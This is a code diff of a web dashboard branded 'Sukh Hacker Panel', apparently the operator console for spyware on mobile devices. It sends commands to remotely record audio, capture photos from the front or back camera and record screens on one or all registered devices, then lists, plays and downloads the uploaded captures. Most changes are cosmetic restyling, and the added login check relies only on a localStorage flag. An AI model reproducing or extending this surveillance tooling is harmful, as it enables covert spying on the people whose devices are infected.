                     <button class="btn btn-stop" onclick="sendCommand('stop_recording')">
-                        ⏹️ Stop All Recording
+                        <i class="fas fa-stop"></i> Stop All Recording
                     </button>
                 </div>
 
                 <div class="btn-group">
                     <button class="btn btn-camera" onclick="sendCameraCommand('front_camera')">
-                        📱 Front Camera All
+                        <i class="fas fa-mobile-alt"></i> Front Camera All
                     </button>
                     <button class="btn btn-camera" onclick="sendCameraCommand('back_camera')">
-                        📷 Back Camera All
+                        <i class="fas fa-camera"></i> Back Camera All
                     </button>
                     <button class="btn btn-camera" onclick="sendCameraCommand('capture_photo')">
-                        📸 Capture Photo All
+                        <i class="fas fa-camera-retro"></i> Capture Photo All
                     </button>
                 </div>
 
                 <div class="btn-group">
                     <button class="btn btn-screen" onclick="sendCommand('start_screen_recording')">
-                        📱 Start Screen Recording All
+                        <i class="fas fa-video"></i> Start Screen Recording All
                     </button>
                     <button class="btn btn-stop" onclick="sendCommand('stop_screen_recording')">
-                        ⏹️ Stop Screen Recording All
+                        <i class="fas fa-stop"></i> Stop Screen Recording All
                     </button>
                 </div>
 
                 <div class="status-box">
-                    <h4>🌐 Global Status</h4>
+                    <h4><i class="fas fa-chart-bar"></i> Global Status</h4>
                     <div id="globalStatus">Ready to send global commands...</div>
                 </div>
             </div>
@@ -649,15 +906,23 @@ button:focus {
         <!-- Recordings Tab -->
         <div id="recordings" class="tab-content">
             <div class="control-panel">
-                <h3 style="color: #00ccff; margin-bottom: 20px;">🎵 Audio Recordings</h3>
-                <button class="btn btn-refresh" onclick="refreshFiles()">
-                    🔄 Refresh Recordings
-                </button>
-                <span id="filesCount" style="margin-left: 15px; color: #00ff88;">0 files</span>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
+                    <h3 style="color: var(--secondary);">
+                        <i class="fas fa-microphone"></i> Audio Recordings
+                    </h3>
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <span id="filesCount" style="color: var(--primary); font-weight: bold;">0 files</span>
+                        <button class="btn btn-refresh" onclick="refreshFiles()">
+                            <i class="fas fa-sync-alt"></i> Refresh Recordings
+                        </button>
+                    </div>
+                </div>
                 
-                <div class="files-grid" id="filesList" style="margin-top: 20px;">
-                    <div style="text-align: center; color: #888; padding: 40px; width: 100%;">
-                        <div style="font-size: 3rem; margin-bottom: 20px;">🎵</div>
+                <div class="files-grid" id="filesList">
+                    <div class="no-data">
+                        <div class="no-data-icon">
+                            <i class="fas fa-microphone"></i>
+                        </div>
                         <h3>No recordings found</h3>
                         <p>Recordings will appear here when devices upload audio files</p>
                     </div>
@@ -668,15 +933,23 @@ button:focus {
         <!-- Photos Tab -->
         <div id="photos" class="tab-content">
             <div class="control-panel">
-                <h3 style="color: #00ccff; margin-bottom: 20px;">📸 Captured Photos</h3>
-                <button class="btn btn-refresh" onclick="refreshPhotos()">
-                    🔄 Refresh Photos
-                </button>
-                <span id="photosCount" style="margin-left: 15px; color: #00ff88;">0 photos</span>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
+                    <h3 style="color: var(--secondary);">
+                        <i class="fas fa-camera"></i> Captured Photos
+                    </h3>
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <span id="photosCount" style="color: var(--primary); font-weight: bold;">0 photos</span>
+                        <button class="btn btn-refresh" onclick="refreshPhotos()">
+                            <i class="fas fa-sync-alt"></i> Refresh Photos
+                        </button>
+                    </div>
+                </div>
                 
-                <div class="files-grid" id="photosList" style="margin-top: 20px;">
-                    <div style="text-align: center; color: #888; padding: 40px; width: 100%;">
-                        <div style="font-size: 3rem; margin-bottom: 20px;">📸</div>
+                <div class="files-grid" id="photosList">
+                    <div class="no-data">
+                        <div class="no-data-icon">
+                            <i class="fas fa-camera"></i>
+                        </div>
                         <h3>No photos found</h3>
                         <p>Photos will appear here when devices capture and upload images</p>
                     </div>
@@ -687,15 +960,23 @@ button:focus {
         <!-- Screen Recordings Tab -->
         <div id="screenRecordings" class="tab-content">
             <div class="control-panel">
-                <h3 style="color: #00ccff; margin-bottom: 20px;">📹 Screen Recordings</h3>
-                <button class="btn btn-refresh" onclick="refreshScreenRecordings()">
-                    🔄 Refresh Screen Recordings
-                </button>
-                <span id="screenRecordingsCount" style="margin-left: 15px; color: #00ff88;">0 recordings</span>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 15px;">
+                    <h3 style="color: var(--secondary);">
+                        <i class="fas fa-video"></i> Screen Recordings
+                    </h3>
+                    <div style="display: flex; align-items: center; gap: 15px;">
+                        <span id="screenRecordingsCount" style="color: var(--primary); font-weight: bold;">0 recordings</span>
+                        <button class="btn btn-refresh" onclick="refreshScreenRecordings()">
+                            <i class="fas fa-sync-alt"></i> Refresh Screen Recordings
+                        </button>
+                    </div>
+                </div>
                 
-                <div class="files-grid" id="screenRecordingsList" style="margin-top: 20px;">
-                    <div style="text-align: center; color: #888; padding: 40px; width: 100%;">
-                        <div style="font-size: 3rem; margin-bottom: 20px;">📹</div>
+                <div class="files-grid" id="screenRecordingsList">
+                    <div class="no-data">
+                        <div class="no-data-icon">
+                            <i class="fas fa-video"></i>
+                        </div>
                         <h3>No screen recordings found</h3>
                         <p>Screen recordings will appear here when devices upload video files</p>
                     </div>
@@ -710,12 +991,41 @@ button:focus {
                 <span>Server Time: <span id="serverTime">{{ current_time }}</span></span>
                 <span>|</span>
                 <span>Server: {{ server_ip }}</span>
+                <span>|</span>
+                <span>Connected Devices: <span id="connectedDevicesCount">0</span></span>
             </div>
         </div>
     </div>
 
     <script>
+        // Authentication check
+        function checkAuth() {
+            const isAuthenticated = localStorage.getItem('isAuthenticated');
+            if (!isAuthenticated || isAuthenticated !== 'true') {
+                window.location.href = 'login.html';
+            }
+        }
+
+        // Logout function
+        function logout() {
+            localStorage.removeItem('isAuthenticated');
+            window.location.href = 'login.html';
+        }
+
+        // Toast notification function
+        function showToast(message, type = 'info', duration = 3000) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast ${type}`;
+            toast.classList.add('show');
+            
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, duration);
+        }
+
         let currentDeviceId = null;
+        let deviceIds = new Set(); // Track unique device IDs
 
         function openTab(tabName) {
             // Hide all tab contents
@@ -733,6 +1043,18 @@ button:focus {
             
             // Activate clicked button
             event.currentTarget.classList.add('active');
+            
+            // Show toast for tab change on mobile
+            if (window.innerWidth <= 768) {
+                const tabNames = {
+                    'devices': 'Devices',
+                    'global': 'Global Control',
+                    'recordings': 'Recordings',
+                    'photos': 'Photos',
+                    'screenRecordings': 'Screen Recordings'
+                };
+                showToast(`Switched to ${tabNames[tabName]}`, 'info', 1500);
+            }
         }
 
         function showAllDevices() {
@@ -749,6 +1071,9 @@ button:focus {
             document.getElementById('currentDeviceName').textContent = `Device: ${deviceId}`;
             loadDeviceDetails(deviceId);
             refreshDeviceFiles();
+            
+            // Show toast
+            showToast(`Controlling device: ${deviceId.substring(0, 15)}...`, 'info');
         }
 
         function loadDeviceDetails(deviceId) {
@@ -780,6 +1105,13 @@ button:focus {
         }
 
         function refreshDevices() {
+            // Add refresh animation
+            const refreshBtn = document.getElementById('refreshDevicesBtn');
+            refreshBtn.classList.add('refresh-animation');
+            setTimeout(() => {
+                refreshBtn.classList.remove('refresh-animation');
+            }, 500);
+            
             console.log("Refreshing devices...");
             fetch('/get_devices')
                 .then(response => {
@@ -794,8 +1126,16 @@ button:focus {
                     
                     if (data.devices && Object.keys(data.devices).length > 0) {
                         let devicesHtml = '';
+                        deviceIds.clear(); // Clear previous device IDs
                         
                         for (let device_id in data.devices) {
+                            // Skip if we've already processed this device ID (fix for duplicates)
+                            if (deviceIds.has(device_id)) {
+                                console.log(`Skipping duplicate device: ${device_id}`);
+                                continue;
+                            }
+                            deviceIds.add(device_id);
+                            
                             const device = data.devices[device_id];
                             let status = device.recording ? 'RECORDING' : (device.screen_recording ? 'SCREEN RECORDING' : 'IDLE');
                             let statusClass = device.recording ? 'recording' : (device.screen_recording ? 'screen-recording' : 'idle');
@@ -806,21 +1146,24 @@ button:focus {
                             devicesHtml += `
                                 <div class="device-card ${statusClass}" onclick="showDeviceControl('${device_id}')">
                                     <div class="device-icon">
-                                        ${statusIcon}
+                                        <i class="fas fa-mobile-alt"></i>
                                     </div>
                                     <div class="device-info">
-                                        <h3>${deviceShortId}</h3>
+                                        <h3>Device <span class="device-id">${deviceShortId}</span></h3>
                                         <div class="device-status">
                                             <div class="status-dot ${statusClass}"></div>
                                             <span>${status}</span>
                                         </div>
                                         <div class="device-status">
+                                            <i class="far fa-clock"></i>
                                             <span>Last Seen: ${lastSeen}</span>
                                         </div>
                                         <div class="device-status">
+                                            <i class="fas fa-microphone"></i>
                                             <span>Audio Recording: ${device.recording ? 'Yes' : 'No'}</span>
                                         </div>
                                         <div class="device-status">
+                                            <i class="fas fa-video"></i>
                                             <span>Screen Recording: ${device.screen_recording ? 'Yes' : 'No'}</span>
                                         </div>
                                     </div>
@@ -828,21 +1171,27 @@ button:focus {
                         }
                         
                         devicesGrid.innerHTML = devicesHtml;
+                        document.getElementById('connectedDevicesCount').textContent = deviceIds.size;
                     } else {
                         devicesGrid.innerHTML = `
-                            <div style="text-align: center; color: #888; padding: 40px; width: 100%;">
-                                <div style="font-size: 3rem; margin-bottom: 20px;">📱</div>
+                            <div class="no-data">
+                                <div class="no-data-icon">
+                                    <i class="fas fa-mobile-alt"></i>
+                                </div>
                                 <h3>No devices connected</h3>
                                 <p>Waiting for devices to register...</p>
                             </div>`;
+                        document.getElementById('connectedDevicesCount').textContent = '0';
                     }
                 })
                 .catch(error => {
                     console.error('Error loading devices:', error);
                     const devicesGrid = document.getElementById('devicesGrid');
                     devicesGrid.innerHTML = `
-                        <div style="text-align: center; color: #ff4444; padding: 40px; width: 100%;">
-                            <div style="font-size: 3rem; margin-bottom: 20px;">❌</div>
+                        <div class="error-message">
+                            <div style="font-size: 3rem; margin-bottom: 20px;">
+                                <i class="fas fa-exclamation-triangle"></i>
+                            </div>
                             <h3>Error loading devices</h3>
                             <p>${error.message}</p>
                         </div>`;
@@ -851,7 +1200,7 @@ button:focus {
 
         function sendDeviceCommand(command) {
             if (!currentDeviceId) {
-                alert('No device selected');
+                showToast('No device selected', 'error');
                 return;
             }
 
@@ -870,20 +1219,23 @@ button:focus {
             .then(data => {
                 if (data.status === 'command_sent') {
                     statusElement.innerHTML = `✅ Command sent: ${command} to device`;
+                    showToast(`Command sent to device: ${command}`, 'success');
                     setTimeout(() => loadDeviceDetails(currentDeviceId), 1000);
                     setTimeout(() => refreshDevices(), 1000);
                 } else {
                     statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                    showToast(`Failed to send command: ${data.message || 'Unknown error'}`, 'error');
                 }
             })
             .catch(error => {
                 statusElement.innerHTML = `❌ Network error: ${error}`;
+                showToast(`Network error: ${error}`, 'error');
             });
         }
 
         function sendDeviceCameraCommand(command) {
             if (!currentDeviceId) {
-                alert('No device selected');
+                showToast('No device selected', 'error');
                 return;
             }
 
@@ -902,12 +1254,15 @@ button:focus {
             .then(data => {
                 if (data.status === 'command_sent') {
                     statusElement.innerHTML = `✅ Camera command sent: ${command}`;
+                    showToast(`Camera command sent: ${command}`, 'success');
                 } else {
                     statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                    showToast(`Failed to send camera command: ${data.message || 'Unknown error'}`, 'error');
                 }
             })
             .catch(error => {
                 statusElement.innerHTML = `❌ Network error: ${error}`;
+                showToast(`Network error: ${error}`, 'error');
             });
         }
 
@@ -929,7 +1284,7 @@ button:focus {
                                 filesHtml += `
                                     <div class="file-card">
                                         <div class="file-header">
-                                            <div class="file-type">📷</div>
+                                            <div class="file-type"><i class="fas fa-camera"></i></div>
                                         </div>
                                         <div class="file-info">
                                             <div><strong>File:</strong> ${file.filename}</div>
@@ -937,18 +1292,18 @@ button:focus {
                                             <div><strong>Uploaded:</strong> ${uploadDate}</div>
                                         </div>
                                         <div style="text-align: center; margin: 15px 0;">
-                                            <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid #00ff88;">
+                                            <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid var(--primary);">
                                         </div>
                                         <div class="file-actions">
-                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
-                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
+                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
                                         </div>
                                     </div>`;
                             } else if (file.type === 'screen_recording') {
                                 filesHtml += `
                                     <div class="file-card">
                                         <div class="file-header">
-                                            <div class="file-type">📹</div>
+                                            <div class="file-type"><i class="fas fa-video"></i></div>
                                         </div>
                                         <div class="file-info">
                                             <div><strong>File:</strong> ${file.filename}</div>
@@ -960,15 +1315,15 @@ button:focus {
                                             Your browser does not support the video tag.
                                         </video>
                                         <div class="file-actions">
-                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
-                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
+                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
                                         </div>
                                     </div>`;
                             } else {
                                 filesHtml += `
                                     <div class="file-card">
                                         <div class="file-header">
-                                            <div class="file-type">🎵</div>
+                                            <div class="file-type"><i class="fas fa-microphone"></i></div>
                                         </div>
                                         <div class="file-info">
                                             <div><strong>File:</strong> ${file.filename}</div>
@@ -979,20 +1334,20 @@ button:focus {
                                             <source src="${fileUrl}" type="audio/3gpp">
                                         </audio>
                                         <div class="file-actions">
-                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
-                                            <button class="btn btn-refresh" onclick="playFile('${file.filename}')">▶️ Play</button>
+                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
+                                            <button class="btn btn-refresh" onclick="playFile('${file.filename}')"><i class="fas fa-play"></i> Play</button>
                                         </div>
                                     </div>`;
                             }
                         });
                     } else {
-                        filesHtml = '<div style="text-align: center; color: #888; padding: 20px;">No files found for this device</div>';
+                        filesHtml = '<div class="no-data">No files found for this device</div>';
                     }
                     
                     document.getElementById('deviceFilesList').innerHTML = filesHtml;
                 })
                 .catch(error => {
-                    document.getElementById('deviceFilesList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading device files</div>';
+                    document.getElementById('deviceFilesList').innerHTML = '<div class="error-message">Error loading device files</div>';
                 });
         }
 
@@ -1009,13 +1364,16 @@ button:focus {
             .then(data => {
                 if (data.status === 'command_sent') {
                     statusElement.innerHTML = `✅ Command sent: ${command} | Devices: ${data.devices_count}`;
+                    showToast(`Command sent to ${data.devices_count} devices: ${command}`, 'success');
                     setTimeout(() => refreshDevices(), 1000);
                 } else {
                     statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                    showToast(`Failed to send command: ${data.message || 'Unknown error'}`, 'error');
                 }
             })
             .catch(error => {
                 statusElement.innerHTML = `❌ Network error: ${error}`;
+                showToast(`Network error: ${error}`, 'error');
             });
         }
 
@@ -1035,13 +1393,16 @@ button:focus {
             .then(data => {
                 if (data.status === 'success') {
                     statusElement.innerHTML = `✅ Camera command sent: ${command}`;
+                    showToast(`Camera command sent: ${command}`, 'success');
                     setTimeout(() => refreshDevices(), 1000);
                 } else {
                     statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                    showToast(`Failed to send camera command: ${data.message || 'Unknown error'}`, 'error');
                 }
             })
             .catch(error => {
                 statusElement.innerHTML = `❌ Network error: ${error}`;
+                showToast(`Network error: ${error}`, 'error');
             });
         }
 
@@ -1061,7 +1422,7 @@ button:focus {
                             filesHtml += `
                                 <div class="file-card">
                                     <div class="file-header">
-                                        <div class="file-type">🎵</div>
+                                        <div class="file-type"><i class="fas fa-microphone"></i></div>
                                     </div>
                                     <div class="file-info">
                                         <div><strong>File:</strong> ${file.filename}</div>
@@ -1073,19 +1434,19 @@ button:focus {
                                         <source src="${fileUrl}" type="audio/3gpp">
                                     </audio>
                                     <div class="file-actions">
-                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
-                                        <button class="btn btn-refresh" onclick="playFile('${file.filename}')">▶️ Play</button>
+                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
+                                        <button class="btn btn-refresh" onclick="playFile('${file.filename}')"><i class="fas fa-play"></i> Play</button>
                                     </div>
                                 </div>`;
                         });
                     } else {
-                        filesHtml = '<div style="text-align: center; color: #888; padding: 40px; width: 100%;"><div style="font-size: 3rem; margin-bottom: 20px;">🎵</div><h3>No recordings found</h3><p>Recordings will appear here when devices upload audio files</p></div>';
+                        filesHtml = '<div class="no-data"><div class="no-data-icon"><i class="fas fa-microphone"></i></div><h3>No recordings found</h3><p>Recordings will appear here when devices upload audio files</p></div>';
                         document.getElementById('filesCount').textContent = '0 files';
                     }
                     document.getElementById('filesList').innerHTML = filesHtml;
                 })
                 .catch(error => {
-                    document.getElementById('filesList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading files</div>';
+                    document.getElementById('filesList').innerHTML = '<div class="error-message">Error loading files</div>';
                 });
         }
 
@@ -1105,7 +1466,7 @@ button:focus {
                             photosHtml += `
                                 <div class="file-card">
                                     <div class="file-header">
-                                        <div class="file-type">📷</div>
+                                        <div class="file-type"><i class="fas fa-camera"></i></div>
                                     </div>
                                     <div class="file-info">
                                         <div><strong>File:</strong> ${file.filename}</div>
@@ -1114,22 +1475,22 @@ button:focus {
                                         <div><strong>Uploaded:</strong> ${uploadDate}</div>
                                     </div>
                                     <div style="text-align: center; margin: 15px 0;">
-                                        <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid #00ff88;">
+                                        <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid var(--primary);">
                                     </div>
                                     <div class="file-actions">
-                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
-                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
+                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
                                     </div>
                                 </div>`;
                         });
                     } else {
-                        photosHtml = '<div style="text-align: center; color: #888; padding: 40px; width: 100%;"><div style="font-size: 3rem; margin-bottom: 20px;">📸</div><h3>No photos found</h3><p>Photos will appear here when devices capture and upload images</p></div>';
+                        photosHtml = '<div class="no-data"><div class="no-data-icon"><i class="fas fa-camera"></i></div><h3>No photos found</h3><p>Photos will appear here when devices capture and upload images</p></div>';
                         document.getElementById('photosCount').textContent = '0 photos';
                     }
                     document.getElementById('photosList').innerHTML = photosHtml;
                 })
                 .catch(error => {
-                    document.getElementById('photosList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading photos</div>';
+                    document.getElementById('photosList').innerHTML = '<div class="error-message">Error loading photos</div>';
                 });
         }
 
@@ -1149,7 +1510,7 @@ button:focus {
                             screenRecordingsHtml += `
                                 <div class="file-card">
                                     <div class="file-header">
-                                        <div class="file-type">📹</div>
+                                        <div class="file-type"><i class="fas fa-video"></i></div>
                                     </div>
                                     <div class="file-info">
                                         <div><strong>File:</strong> ${file.filename}</div>
@@ -1162,24 +1523,25 @@ button:focus {
                                         Your browser does not support the video tag.
                                     </video>
                                     <div class="file-actions">
-                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
-                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')"><i class="fas fa-download"></i> Download</button>
+                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')"><i class="fas fa-trash"></i> Delete</button>
                                     </div>
                                 </div>`;
                         });
                     } else {
-                        screenRecordingsHtml = '<div style="text-align: center; color: #888; padding: 40px; width: 100%;"><div style="font-size: 3rem; margin-bottom: 20px;">📹</div><h3>No screen recordings found</h3><p>Screen recordings will appear here when devices upload video files</p></div>';
+                        screenRecordingsHtml = '<div class="no-data"><div class="no-data-icon"><i class="fas fa-video"></i></div><h3>No screen recordings found</h3><p>Screen recordings will appear here when devices upload video files</p></div>';
                         document.getElementById('screenRecordingsCount').textContent = '0 recordings';
                     }
                     document.getElementById('screenRecordingsList').innerHTML = screenRecordingsHtml;
                 })
                 .catch(error => {
-                    document.getElementById('screenRecordingsList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading screen recordings</div>';
+                    document.getElementById('screenRecordingsList').innerHTML = '<div class="error-message">Error loading screen recordings</div>';
                 });
         }
 
         function downloadFile(filename) {
             window.open('/file/' + filename, '_blank');
+            showToast(`Downloading: ${filename}`, 'info');
         }
 
         function playFile(filename) {
@@ -1187,6 +1549,7 @@ button:focus {
             if (audioElement) {
                 audioElement.play().catch(e => {
                     console.error('Play error:', e);
+                    showToast('Cannot play audio file', 'error');
                 });
             }
         }
@@ -1197,6 +1560,7 @@ button:focus {
                     .then(response => response.json())
                     .then(data => {
                         if (data.status === 'success') {
+                            showToast(`File deleted: ${filename}`, 'success');
                             refreshPhotos();
                             refreshFiles();
                             refreshScreenRecordings();
@@ -1204,17 +1568,48 @@ button:focus {
                                 refreshDeviceFiles();
                             }
                         } else {
-                            alert('Delete failed: ' + data.message);
+                            showToast(`Delete failed: ${data.message}`, 'error');
                         }
                     })
                     .catch(error => {
-                        alert('Delete error: ' + error);
+                        showToast(`Delete error: ${error}`, 'error');
                     });
             }
         }
 
         function updateTime() {
             document.getElementById('serverTime').textContent = new Date().toLocaleString();
+        }
+
+        // Mobile menu functionality
+        function setupMobileMenu() {
+            const fab = document.getElementById('fab');
+            const tabsContainer = document.getElementById('tabsContainer');
+            
+            fab.addEventListener('click', function() {
+                if (tabsContainer.style.display === 'flex') {
+                    tabsContainer.style.display = 'none';
+                    fab.innerHTML = '<i class="fas fa-bars"></i>';
+                } else {
+                    tabsContainer.style.display = 'flex';
+                    fab.innerHTML = '<i class="fas fa-times"></i>';
+                }
+            });
+            
+            // Hide tabs by default on mobile
+            if (window.innerWidth <= 768) {
+                tabsContainer.style.display = 'none';
+            }
+            
+            // Show tabs on larger screens
+            window.addEventListener('resize', function() {
+                if (window.innerWidth > 768) {
+                    tabsContainer.style.display = 'flex';
+                } else {
+                    tabsContainer.style.display = 'none';
+                    fab.innerHTML = '<i class="fas fa-bars"></i>';
+                }
+            });
         }
 
         // Auto refresh
@@ -1225,11 +1620,18 @@ button:focus {
         setInterval(updateTime, 1000);
         
         // Initial load
+        checkAuth();
         refreshDevices();
         refreshFiles();
         refreshPhotos();
         refreshScreenRecordings();
         updateTime();
+        setupMobileMenu();
+        
+        // Show welcome message
+        setTimeout(() => {
+            showToast('Welcome to Sukh Hacker Panel!', 'success', 2000);
+        }, 1000);
     </script>
 </body>
 </html>
